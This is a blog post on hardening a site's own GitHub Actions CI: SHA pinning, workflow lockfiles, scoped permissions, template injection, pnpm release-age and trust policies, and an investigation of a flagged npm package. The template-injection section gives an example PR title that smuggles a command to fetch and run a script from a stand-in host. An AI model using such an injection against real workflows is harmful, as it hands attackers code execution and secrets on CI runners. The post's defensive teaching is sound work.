---
title: I Ran zizmor on My Own CI, Then Fixed It One Finding at a Time
date: 2026-11-04
tags: [security, devops, ci-cd]
description: Applying the lessons of the LiteLLM incident to this site's own GitHub Actions — SHA pinning, least privilege, persist-credentials, template injection, pnpm's minimumReleaseAge and trustPolicy — plus a real investigation into a "possible package takeover" the policy caught.
---

## Done critiquing others, time to critique myself

In the [previous post](/blog/2026-11-03-litellm-unrevoked-key-supply-chain) I took apart LiteLLM's attack chain and sounded very sure of myself doing it. Once I'd finished writing, though, I got a little uneasy: **what about this site's own CI?**

This portfolio site runs on Cloudflare Pages, and it has two workflows on GitHub:

- `argos.yml`: takes screenshots with Playwright and sends them to Argos for visual regression testing
- `bearer.yml`: static security scanning with Bearer

I copied both from the official examples. They worked and nothing had ever gone wrong, so I'd never really looked at them. As it happens, GitHub announced at the end of October that Actions workflow lockfiles are GA, and the npm ecosystem keeps producing news of poisoned packages. So why not put my own repo on the operating table and document the whole process?

Every change in this post has been committed to this site's repo, and every scan result here comes from an actual run.

## Step one: scan first, don't guess

I used two tools:

- **[zizmor](https://docs.zizmor.sh/)**: a static analysis tool built specifically to find security problems in GitHub Actions. It's written in Rust and installs quickly
- **[actionlint](https://github.com/rhysd/actionlint)**: catches workflow syntax errors and expression type errors, and if you have shellcheck installed it'll even check the shell scripts inside `run:`

```bash
pip install zizmor        # The real install method comes later; this is just to get it running
go install github.com/rhysd/actionlint/cmd/actionlint@v1.7.12

actionlint                       # Syntax check
zizmor --offline .github/        # Default mode
zizmor --offline --persona=pedantic .github/   # Nitpick mode
```

actionlint didn't find anything, which didn't surprise me — a workflow that runs is usually syntactically fine. But zizmor's results made me blush a bit:

| Rule | Count | Severity | In plain English |
|---|---|---|---|
| `unpinned-uses` | 6 | high | Actions referenced by tag (`@v6`) instead of commit SHA |
| `excessive-permissions` | 1 | high | `id-token: write` granted at the whole-workflow level |
| `artipacked` | 3 | low | checkout leaves the token behind on the runner |
| `template-injection` | 4 | pedantic | `${{ }}` written directly into shell scripts |
| `anonymous-definition` | 3 | pedantic | Jobs without a `name` |

17 findings. Let's go through them one by one.

## Problem one: `@v6` isn't the `@v6` you think it is

Here's what I had:

```yaml
- uses: actions/checkout@v6
- uses: pnpm/action-setup@v6
- uses: actions/setup-node@v6
- uses: bearer/bearer-action@v2
```

Looks perfectly normal, right? That's how the official docs write it too.

The problem is that **git tags can move**. `v6` is just a pointer, and the maintainer — or whoever steals the maintainer's account — can repoint it to a different commit at any time. The next time your workflow runs, GitHub will dutifully fetch that new commit and run it, and you'll have no idea.

This isn't theoretical. That's exactly what happened in the `tj-actions/changed-files` incident in March 2025: the attacker repointed almost every version tag to a malicious commit that printed secrets from the runner's memory into the log. Public repos using that action ended up with their secrets laid out in public Actions logs.

The fix is to use a **commit SHA** instead, because a SHA is a hash of the content and can't be changed.

### How do you look up the SHA? Watch out for annotated tags

```bash
git ls-remote --tags https://github.com/actions/checkout.git | grep -E 'v6\.1\.0'
# d23441a48e516b6c34aea4fa41551a30e30af803  refs/tags/v6.1.0
```

There's a small gotcha here: if the tag is an **annotated tag**, `ls-remote` lists two lines. One is the SHA of the tag object itself; the other ends in `^{}`, and that one is the actual commit SHA. `uses:` needs the commit:

```text
9f698171ed81b15d1823a05fc7211befd50c8ae0  refs/tags/v6.0.3      ← tag object, don't use this
df4cb1c069e1874edd31b4311f1884172cec0e10  refs/tags/v6.0.3^{}   ← commit, use this
```

I wrote a little one-liner to find out which version `v6` actually points to right now:

```bash
repo=actions/checkout; major=v6
out=$(git ls-remote --tags https://github.com/$repo.git)
commit_of() {  # Prefer ^{} (the commit an annotated tag points to)
  local p=$(echo "$out" | awk -v t="refs/tags/$1^{}" '$2==t{print $1}')
  [ -n "$p" ] && echo "$p" || echo "$out" | awk -v t="refs/tags/$1" '$2==t{print $1}'
}
m=$(commit_of $major); echo "$major -> $m"
echo "$out" | awk '{print $2}' | sed 's#refs/tags/##; s#\^{}##' | sort -u \
  | grep -E "^$major\.[0-9]+(\.[0-9]+)?$" \
  | while read t; do [ "$(commit_of $t)" = "$m" ] && echo "  = $t"; done
# v6 -> d23441a48e516b6c34aea4fa41551a30e30af803
#   = v6.1.0
```

After the change it looks like this; the trailing comment is the version number, for humans:

```yaml
- uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6.1.0
- uses: pnpm/action-setup@73e46992e05b19abd31f2f3c20e0e7370d762115 # v6.1.1
- uses: actions/setup-node@249970729cb0ef3589644e2896645e5dc5ba9c38 # v6.5.0
- uses: bearer/bearer-action@828eeb928ce2f4a7ca5ed57fb8b59508cb8c79bc # v2
```

### Doesn't that mean the SHAs never get updated?

Right, which is why you pair it with Dependabot. It understands the `@<sha> # v6.1.0` format, and when there's a new version it opens a PR that updates both the SHA and the comment:

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    target-branch: dev
    schedule:
      interval: weekly
    # Wait at least 7 days after a new version is published before opening a PR, to dodge the "poisoned right after release" window
    cooldown:
      default-days: 7
    groups:
      github-actions:
        patterns: ["*"]
```

`cooldown` is the line I consider most important. LiteLLM's malicious release only lived for two hours, and the malicious tj-actions commit was also caught within days. **Let someone else step on the landmine first.** It sounds selfish, but in supply chain security it's a very practical strategy.

## SHA pinning isn't a silver bullet (part one): actions download more stuff at runtime

After switching to SHAs, I took a quick look at what `bearer-action` actually does. Opening its `action.yml`:

```yaml
runs:
  using: "composite"
  steps:
    - shell: bash
      run: |
        VERSION="${{ inputs.version }}"
        ...
        curl -sfL https://raw.githubusercontent.com/Bearer/bearer/main/contrib/install.sh | sh -s -- -b "$RUNNER_TEMP" "$VERSION"
```

Hmm... I'd locked the action to a specific SHA, but the moment it runs it fetches install.sh from the **`main` branch** and executes it — and since I hadn't specified a `version`, install.sh downloads the **latest** Bearer CLI.

In other words, all I'd pinned was the shell; the program that actually runs inside was still floating.

install.sh does verify a checksum, but the checksum file and the binary come from **the same release**. That protects against files getting corrupted in transit, not against the release itself being swapped out. If someone can publish a malicious Bearer release, they can obviously publish a matching checksum too. It's the same principle as "the signature was real" from the LiteLLM post.

What I can do is at least pin the CLI version:

```yaml
- name: Run Bearer security scan
  uses: bearer/bearer-action@828eeb928ce2f4a7ca5ed57fb8b59508cb8c79bc # v2
  with:
    # The action itself is pinned to a SHA, but it downloads the Bearer CLI at runtime;
    # without a version it fetches the "latest", so pin it here too
    version: "2.1.3"
    config-file: bearer.yml
```

I can't change the fact that `install.sh` is downloaded from `main`, short of forking the action or writing my own download step. That's a known, accepted residual risk. **After you SHA-pin an action, remember to open its source and see what else it fetches.**

## SHA pinning isn't a silver bullet (part two): fork commits resolve too

Remember that detail from the previous post? LiteLLM's attacker created a fork under the lookalike org `Berri-AI`, yet that fork's commit opens just fine at `github.com/BerriAI/litellm/commit/20535d8f`, because GitHub lets forks share git objects with the original repo.

That's a hole in SHA pinning too. In theory, someone could send you a PR that changes `uses: actions/checkout@<sha>` to a **malicious commit in a fork**. Because `actions/checkout@<that SHA>` really does resolve, the reviewer just sees one 40-character hash swapped for another, which is very hard to spot. zizmor has an `impostor-commit` check specifically for this (it needs online mode).

This is one of the reasons GitHub introduced lockfiles.

## A better approach: Actions workflow lockfiles

GitHub released Actions workflow lockfiles as a public preview on October 14 and made them GA on October 28. The idea is the same as `composer.lock` or `pnpm-lock.yaml`: `gh actions-lock` generates `.github/workflows/actions.lock`, recording which commit every action resolves to — **including the other actions used inside those actions**.

```yaml
# .github/workflows/actions.lock (example from the official docs)
version: 'v0.0.3'
workflows:
    '.github/workflows/ci.yml':
        - 'octo-org/deploy-action@v3.1.0'
dependencies:
    'octo-org/deploy-action@v3.1.0':
        ref: 'v3.1.0'
        commit: 'sha1-...'
        owner_id: 44036562
        repo_id: 197814629
```

It beats manual SHA pinning in three ways:

1. **It pins transitive dependencies too**: manual pinning only reaches the layer you wrote yourself
2. **It records `owner_id` / `repo_id`**: even if a repo is deleted and someone registers a repo with the same name, the numeric IDs won't match
3. **It checks that the commit is reachable from the recorded tag or branch**: commits that exist only in a fork get rejected, which closes exactly the impostor commit hole above

And the runner enforces it at run time — it's not just a lint. Usage:

```bash
gh extension install github/gh-actions-lock
gh actions-lock              # Generate or fix actions.lock
git add .github/workflows/
gh actions-lock --verify     # Put this in CI so nobody commits a broken lockfile
```

But to be honest about its limitations (from the official README):

- Calls to **reusable workflows in other repos** (`jobs.<id>.uses`) aren't locked
- **Container images** aren't locked; without an `@sha256:` digest you only get a warning
- Local actions in the same repo (`./...`) aren't followed
- The tool is still pre-1.0

**So where is my repo right now?** `gh actions-lock` needs a logged-in `gh` CLI, and I did this hardening in an environment without a GitHub login, so for now it's manual SHA pinning. The lockfile is the next step — just run those three lines locally. The official docs also say that once you adopt a lockfile, you don't necessarily need SHAs in the workflow files anymore.

## Problem two: too many permissions

The original `argos.yml`:

```yaml
permissions:
  contents: read
  id-token: write # Required for Argos CI GitHub OIDC authentication
```

`id-token: write` lets a job ask GitHub for an **OIDC token** that proves "I am this workflow in this repo." Argos uses it to verify who's uploading, so you don't need a separate API key — which is a good thing.

The problem is that I'd granted it to the **whole workflow**, so the `decide` job, whose only job is deciding whether to run at all, could get one too. OIDC tokens can be exchanged with cloud services for credentials: if someday I set up AWS or GCP to trust this repo, then any single job that gets compromised could trade an OIDC token for cloud permissions.

Switch to everything off at the top level, with each job opting in:

```yaml
# Grant nothing by default; each job only enables what it needs (principle of least privilege)
permissions: {}

jobs:
  decide:
    permissions:
      contents: read
    # ...

  argos:
    permissions:
      contents: read
      id-token: write # Argos authenticates with GitHub OIDC; only this job needs it
```

It's the same thinking as Laravel Policies: deny by default, then explicitly grant what's needed.

## Problem three: checkout leaves the token on the runner

By default, `actions/checkout` saves the `GITHUB_TOKEN` so you can `git push` later. Since v6 it stores it in a separate file under `$RUNNER_TEMP` rather than writing it straight into `.git/config`, but wherever it lives, **every later step in the same job can read it**.

Why is that dangerous? Think about what the `argos` job does afterwards: `pnpm install`. If any dependency ships a malicious install script, it can dig that token up.

My workflows never need to push, so I just turned it off:

```yaml
- uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6.1.0
  with:
    persist-credentials: false # Don't leave the GITHUB_TOKEN behind on the runner
```

## Problem four: `${{ }}` is string substitution, not a variable

The `decide` job originally looked like this:

```yaml
- id: gate
  run: |
    if [ "${{ github.event_name }}" = "push" ] \
       || [ "${{ contains(github.event.pull_request.labels.*.name, 'run-argos-ci') }}" = "true" ]; then
      echo "run=true" >> "$GITHUB_OUTPUT"; exit 0
    fi
    changed=$(git diff --name-only \
      "${{ github.event.pull_request.base.sha }}" \
      "${{ github.event.pull_request.head.sha }}")
```

A lot of people think `${{ }}` works like PHP's `{$var}` interpolation, but it's really more like Blade's `{!! !!}`: **GitHub pastes the value verbatim into the script before the shell ever runs**, with no escaping at all.

If what gets pasted in is something an attacker controls — a PR title, an issue body, a branch name — that's a shell injection:

```yaml
# ❌ Classic mistake: a PR titled  a"; curl https://evil.example/x | sh; echo "
- run: echo "Title: ${{ github.event.pull_request.title }}"
```

My case wasn't directly dangerous: the event name, SHAs and booleans aren't strings an outsider can freely control, which is why zizmor only flags them in pedantic mode. But habits matter — copy-paste this someday and swap in the PR title, and you're done. The right way is to **put it in `env:` first, and only use shell variables inside the script**:

```yaml
- id: gate
  # Always route ${{ }} through env first and only use shell variables in the script, to avoid template injection
  env:
    EVENT_NAME: ${{ github.event_name }}
    HAS_RUN_LABEL: ${{ contains(github.event.pull_request.labels.*.name, 'run-argos-ci') }}
    BASE_SHA: ${{ github.event.pull_request.base.sha }}
    HEAD_SHA: ${{ github.event.pull_request.head.sha }}
  run: |
    if [ "$EVENT_NAME" = "push" ] || [ "$HAS_RUN_LABEL" = "true" ]; then
      echo "run=true" >> "$GITHUB_OUTPUT"; exit 0
    fi
    changed=$(git diff --name-only "$BASE_SHA" "$HEAD_SHA")
```

Passed in through environment variables, the values are just data, and the shell won't parse them as code. It's the prepared statement idea, just applied to the shell.

## Deliberately left unfixed: `anonymous-definition`

What's left in pedantic mode is 3 "job has no `name`" findings, and I'm deliberately not changing them.

The reason is that GitHub's status check names come from the job id or name. If I ever set `decide`, `argos` and `scan` as required checks in branch protection, renaming them would leave those rules pointing at names that no longer exist, and PRs could get stuck or skip the checks entirely. That's not a risk worth taking for an info-level hint. **A tool's suggestions are input, not gospel** — think each one through before you change anything.

## Problem five: the dependencies themselves

With the workflows fixed, the thing in CI that actually runs the most third-party code is `pnpm install`.

### `--frozen-lockfile`

```yaml
- name: Install dependencies
  # --frozen-lockfile: fail if the lockfile and package.json disagree, instead of quietly resolving new versions
  run: pnpm install --frozen-lockfile
```

pnpm actually defaults to frozen in CI environments, but spelling it out is clearer, and it protects you if the default ever changes. It's the same reasoning as running `composer install` rather than `composer update`.

### pnpm 12's two supply chain policies

While going through the pnpm 12 changelog, I discovered that it **already has a built-in 1-day `minimumReleaseAge`**, but in "lenient mode": versions that are too new get added to the exclusion list automatically instead of being blocked. It only becomes strict once you set the value explicitly.

```yaml
# pnpm-workspace.yaml
# Only install versions published more than 3 days ago (in minutes). Setting it explicitly makes it strict: too-new versions fail outright
minimumReleaseAge: 4320
# Reject a package if the way it was published is a "downgrade" from earlier versions (e.g. from trusted publishing to a regular token)
trustPolicy: no-downgrade
```

The logic behind `trustPolicy: no-downgrade` is: if all of a package's earlier versions were published through CI with trusted publishing (with provenance), and suddenly one version was published from someone's machine with a personal token, there's a good chance the account was compromised. That's been a telltale sign in several of the large-scale worm incidents in the npm world.

Here's the effect, tested in a scratch project:

```bash
# Ask for a version published only 2 days ago
pnpm add seroval@1.7.7
#   × 1 version does not meet the minimumReleaseAge constraint:
#       seroval@1.7.7 was published at 2026-11-02T13:24:35.651Z, within the
#     minimumReleaseAge cutoff (2026-11-01T01:38:09.444Z)

# Ask for a range: pnpm automatically picks the newest version that's "old enough"
pnpm add 'seroval@^1.7.0'
# + seroval 1.7.6
```

## And then the policy actually caught something

Once it was set up, I ran `pnpm install --frozen-lockfile` in the project, and got:

```text
  × installing dependencies
  ╰─▶ 2 lockfile entries failed verification:
        semver@6.3.1 High-risk trust downgrade for "semver@6.3.1" (possible
      package takeover)
        seroval@1.7.2 High-risk trust downgrade for "seroval@1.7.2" (possible
      package takeover)
```

"Possible package takeover" — those words still make your heart race. The easy move is to throw them on the exclusion list and move on, but then there'd be no point having the policy. So I looked into each one.

### `seroval@1.7.2`: genuinely suspicious, so I compared the actual contents

`seroval` is the package Nuxt uses to serialize data; it gets pulled in all the way from `@nuxt/vite-builder`. First, the publish history:

```bash
npm view seroval@1.7.1 --json   # Look at dist.attestations and _npmUser
```

| Version | Published | Publisher | Provenance |
|---|---|---|---|
| 1.7.1 | 10/23 | GitHub Actions (trusted publishing) | ✅ |
| **1.7.2** | **10/24** | **Maintainer's personal account** | **❌** |
| 1.7.3 | 10/28 | GitHub Actions (trusted publishing) | ✅ |

Sandwiched between two CI-published versions, out pops a version published by hand from a personal account, with no provenance. That's exactly the pattern you'd see if an account had been taken over.

So I downloaded the tarballs for all three versions and compared them. **Download only, no install** — `--ignore-scripts` makes sure nothing gets executed:

```bash
for v in 1.7.1 1.7.2 1.7.3; do
  npm pack seroval@$v --ignore-scripts
  mkdir $v && tar -xzf seroval-$v.tgz -C $v
done

diff -r 1.7.1/package 1.7.2/package
```

The result:

```diff
diff -r 1.7.1/package/dist/index.js 1.7.2/package/dist/index.js
1692c1692
< 	if (ctx.base.pending && value instanceof Promise) value.catch(ignoreRejection);
---
> 	if (value instanceof Promise) value.catch(ignoreRejection);
diff -r 1.7.1/package/package.json 1.7.2/package/package.json
5c5
<   "version": "1.7.1",
---
>   "version": "1.7.2",
```

(The other three build files under `dist/` have the same one-line change.) Just a one-line bug fix: handling Promise rejections that weren't being caught. No new files, no install scripts, no network requests.

Then 1.7.2 against 1.7.3:

```diff
diff -r 1.7.2/package/package.json 1.7.3/package/package.json
5c5
<   "version": "1.7.2",
---
>   "version": "1.7.3",
```

Apart from the version number, **not a single byte differs**. The reasonable guess: the maintainer first pushed out a hotfix by hand from their own machine, then a few days later published it again properly through CI. Not a takeover.

But the conclusion isn't "add it to the exclusions" — it's **upgrade**. Since the later versions have proper provenance, there's no reason to stay on the suspicious one:

```bash
pnpm update seroval --depth Infinity
```

Within the policy's limits, pnpm chose 1.7.6 (the newest version that's old enough and has provenance), and only 4 lines of the lockfile changed.

### `semver@6.3.1`: a legitimate old backport

`semver@6.3.1` was published by hand by the maintainer in July 2023, as a backport fixing a ReDoS vulnerability (CVE-2022-25883). By then, 7.x had already moved to publishing from CI with provenance, but this 6.x fix was published manually, so it gets flagged as a "downgrade." It's a well-known legitimate case in the industry.

Later, 6.3.2 was republished with trusted publishing, but it only came out on 11/2 — it hasn't reached the 3 days I configured, so I can't upgrade yet. So this one goes on the exclusion list, **with the reason and the removal condition spelled out**:

```yaml
# Exceptions allowed only after manual review; every entry must state a reason
trustPolicyExclude:
  # ReDoS fix backport (CVE-2022-25883) published by hand by the maintainer in 2023-07, without provenance.
  # The later 6.3.2 uses trusted publishing but hasn't reached minimumReleaseAge yet; upgrade later and remove this line
  - semver@6.3.1
```

After that, running it again passes:

```bash
rm -rf node_modules && pnpm install --frozen-lockfile
# Done in 22.9s using pnpm v12.15.0
```

This section was my biggest takeaway from the whole exercise: **security policies produce alerts that need a human to judge them.** At that point the most dangerous thing isn't the alert itself — it's reflexively adding an exception just to turn CI green.

By the way, on 10/20 GitHub also launched a public preview of an npm **package firewall**, which can do similar cooldown and attestation-downgrade checks at the organization level. For now, though, it's only available to GitHub Enterprise Cloud. For personal projects, these two pnpm settings are a free and effective alternative.

## Keeping the checks going: workflow-audit.yml

Scanning by hand once feels great, but the next time someone (usually me, three months from now) adds a workflow, will they remember? So I added a workflow that runs automatically whenever anything under `.github/` changes:

```yaml
name: Workflow Audit

on:
  push:
    branches: [dev, main]
    paths:
      - ".github/**"
  pull_request:
    paths:
      - ".github/**"

permissions: {}

jobs:
  audit:
    name: zizmor + actionlint
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6.1.0
        with:
          persist-credentials: false

      # The runner's system Python is protected by PEP 668, so install into a separate venv
      - name: Install zizmor
        run: |
          python3 -m venv "$RUNNER_TEMP/audit-venv"
          "$RUNNER_TEMP/audit-venv/bin/pip" install --require-hashes -r .github/workflow-audit-requirements.txt

      - name: Run zizmor
        env:
          # Let zizmor read the public repo API (to check for impostor commits and known-vulnerable actions)
          GH_TOKEN: ${{ github.token }}
        run: |
          "$RUNNER_TEMP/audit-venv/bin/zizmor" --format=github .github/

      # go install verifies module contents against sum.golang.org, so hash pinning comes built in
      - name: Run actionlint
        run: |
          go install github.com/rhysd/actionlint/cmd/actionlint@v1.7.12
          "$(go env GOPATH)/bin/actionlint" -color
```

There are two details here worth calling out.

**First, even the checking tools need to be pinned.** zizmor is installed from PyPI using the `--require-hashes` approach from the [previous post](/blog/2026-11-03-litellm-unrevoked-key-supply-chain):

```text
# .github/workflow-audit-requirements.txt
zizmor==1.31.1 \
    --hash=sha256:58e878eb2dbd2c6183c105e1ac28c14f7dd1eca44a783f1fe2a69647d012c410 \
    --hash=sha256:d9b36840c560a8abe39d9ef3d077239aabf6d572c5c2b629c970592a617dbf6f
```

I very nearly contradicted myself: at first I grabbed the latest zizmor, 1.32.0, and only noticed when looking up the hashes that it had been uploaded **the day before**. I'd just finished saying "wait 7 days on new versions," and I was about to break that rule immediately. So I went back to 1.31.1, released on 10/15.

**Second, Go's module system comes with a built-in line of defense.** Modules downloaded by `go install ...@v1.7.12` get their hashes checked against `sum.golang.org`, a public transparency log. Even if someone republishes the same version number, different contents get rejected. This is one of the things I found beautifully designed while learning Go: the lockfiles of npm, pnpm and Composer do record hashes too, but only "after the first download"; Go checks against a public record shared by the whole world even on the very first download, and it's on by default.

## Before and after

| | Before | After |
|---|---|---|
| zizmor (default) | 10 findings (7 high) | **0** |
| zizmor (pedantic) | 17 | 3 (the deliberately kept job names) |
| actionlint + shellcheck | 0 | 0 |
| Action versions | Floating tags | Commit SHAs + Dependabot (7-day cooldown) |
| Bearer CLI | Latest version on every run | Pinned to 2.1.3 |
| `id-token: write` | Whole workflow | `argos` job only |
| Package policy | pnpm default (1 day, lenient) | 3 days strict + trust downgrade check |

## Bonus: a CI template for Laravel + Vite projects

Finally, let's apply the same principles to the kind of project we know best: Laravel. This template **passes actionlint and zizmor (0 findings)**, but I haven't run it on a real Laravel project, so treat it as a starting point and adjust it for your project:

```yaml
name: CI

on:
  push:
    branches: [main]
  pull_request:

permissions: {}

concurrency:
  group: ${{ github.workflow }}-${{ github.head_ref || github.ref }}
  cancel-in-progress: true

jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6.1.0
        with:
          persist-credentials: false

      - uses: shivammathur/setup-php@eb7c497e18156a6bbabfef1d3a82760b9eda3962 # 2.40.0
        with:
          php-version: "8.4"
          coverage: none

      - uses: actions/setup-node@249970729cb0ef3589644e2896645e5dc5ba9c38 # v6.5.0
        with:
          node-version: 22

      # Composer installs strictly from composer.lock. Dependencies' scripts never run anyway;
      # what does run code is plugins: only those listed in composer.json's allow-plugins get loaded (Composer 2.2+)
      - name: Install PHP dependencies
        run: composer install --no-interaction --prefer-dist --no-progress

      - name: Audit PHP dependencies
        run: composer audit --locked

      # npm ci: strictly follows package-lock.json; --ignore-scripts: don't run any package install scripts
      - name: Install JS dependencies
        run: npm ci --ignore-scripts

      - name: Audit JS dependencies
        run: npm audit --audit-level=high

      - name: Build assets
        run: npm run build

      - name: Run tests
        run: php artisan test
```

A few things PHP developers tend to overlook:

- **Composer doesn't run dependencies' `scripts`** — only the root project's (your own `composer.json`). What actually executes third-party code at install time is **plugins**, so review your `allow-plugins` allowlist seriously. If you use Pest, `pestphp/pest-plugin` is one plugin you'll need to allow.
- **`npm ci --ignore-scripts`** blocks every install script. Most of the Vite ecosystem doesn't need them; if you hit a package that really does need to build (like `sharp`), let it through individually with `npm rebuild <package-name>`.
- If your frontend moves to pnpm, just reuse the `minimumReleaseAge` and `trustPolicy` settings above; pnpm also only lets allowlisted packages run build scripts by default.

## What's not done yet

Listing them honestly:

- **Actions lockfile**: needs a logged-in `gh`; next step is running `gh actions-lock` locally
- **Running these changes on GitHub for real**: I verified them locally with actionlint and zizmor, and actually ran `pnpm install --frozen-lockfile`, but the workflows themselves won't truly execute on GitHub until a PR is opened
- **`bearer-action` downloading install.sh from `main`**: a known residual risk

## Checklist

Finally, here's all of it as a checklist you can run against your own repo:

- [ ] Every `uses:` is a 40-character commit SHA with the version in a trailing comment (or switch to an Actions lockfile)
- [ ] Open each action's `action.yml`, see what else it downloads at runtime, and pin every version you can
- [ ] Dependabot (or Renovate) updates the SHAs, with a cooldown configured
- [ ] Top-level `permissions: {}` in every workflow, with each job only enabling what it needs
- [ ] `actions/checkout` has `persist-credentials: false` (unless you really need to push)
- [ ] No `${{ }}` appears directly inside `run:`; route everything through `env:`
- [ ] Package installs use strict lockfile mode (`--frozen-lockfile`, `npm ci`, `composer install`)
- [ ] A minimum release age is configured (pnpm `minimumReleaseAge`, pip `--uploaded-prior-to`, uv `--exclude-newer`)
- [ ] When a policy blocks a package, **investigate before allowing it**, and give every exception a reason and a removal condition
- [ ] A workflow keeps checking the workflows themselves with zizmor / actionlint

The next post covers a different kind of "supply chain": not packages, but the Markdown files your AI coding agent reads.

## References

- [GitHub docs: Workflow dependency lockfiles](https://docs.github.com/en/actions/concepts/security/workflow-dependency-lockfiles)
- [GitHub Changelog: GitHub Actions workflow lockfiles in public preview](https://github.blog/changelog/2026-10-14-github-actions-workflow-lockfiles-in-public-preview/) (2026-10-14)
- [github/gh-actions-lock](https://github.com/github/gh-actions-lock)
- [GitHub Changelog: GitHub package firewall in public preview](https://github.blog/changelog/2026-10-20-github-package-firewall-in-public-preview) (2026-10-20)
- [zizmor docs](https://docs.zizmor.sh/)
- [actionlint](https://github.com/rhysd/actionlint)
- [actions/checkout v6 README](https://github.com/actions/checkout)
- [pnpm settings docs](https://pnpm.io/settings)
